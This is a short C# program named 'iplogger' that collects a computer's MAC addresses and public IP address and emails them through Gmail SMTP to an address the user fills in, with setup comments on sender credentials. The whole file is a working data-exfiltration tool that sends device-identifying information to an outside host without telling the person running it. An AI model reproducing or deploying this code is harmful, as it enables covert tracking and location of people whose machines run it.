using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Mail;
using System.Net.Mime;
using System.Threading;
using System.ComponentModel;

namespace iplogger
{
    class Ip
    {
        public static void Main(string[] args)
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                var mac = string.Join(":", nic.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("X2"))); //gets mac address and writes it into a variable
                string publicip = new WebClient().DownloadString("http://icanhazip.com"); //gets the public ip and writes it into a string
                Console.WriteLine(mac);
                Console.WriteLine(publicip);
                var fromAddress = new MailAddress("from@gmail.com", "From Name"); //change from@gmail.com to the sender email (create an email and set lesssecureapps on)
                var toAddress = new MailAddress("to@example.com", "To Name"); //change to@example.com to the reciever email (set lesssecureapps on)
                var fromPassword = "senderpassword"; //change senderpassword to the password of the sender
                var smtp = new SmtpClient
                {
                    Host = "smtp.gmail.com",
                    Port = 587,
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
                };
                using (var message = new MailMessage(fromAddress, toAddress)
                {
                    Subject = publicip
                    ,Body = mac
                })
                {
                    smtp.Send(message);
                }
            }
        }
    }
}
